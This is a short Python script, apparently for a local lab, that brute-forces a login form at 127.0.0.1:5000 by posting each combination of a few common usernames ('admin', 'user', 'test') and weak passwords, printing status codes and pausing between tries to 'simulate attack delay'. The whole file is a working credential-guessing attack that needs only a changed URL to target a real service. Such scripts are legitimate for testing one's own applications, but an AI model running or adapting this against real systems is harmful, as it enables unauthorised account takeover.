import requests
import time

url = "http://127.0.0.1:5000/login"
usernames = ["admin", "user", "test"]
passwords = ["123", "admin", "pass", "password", "test"]

for username in usernames:
    for password in passwords:
        data = {"username": username, "password": password}
        try:
            r = requests.post(url, data=data)
            print(f"{username}:{password} → {r.status_code}")
        except Exception as e:
            print("Error:", e)
        time.sleep(0.5)  # Simulate attack delay
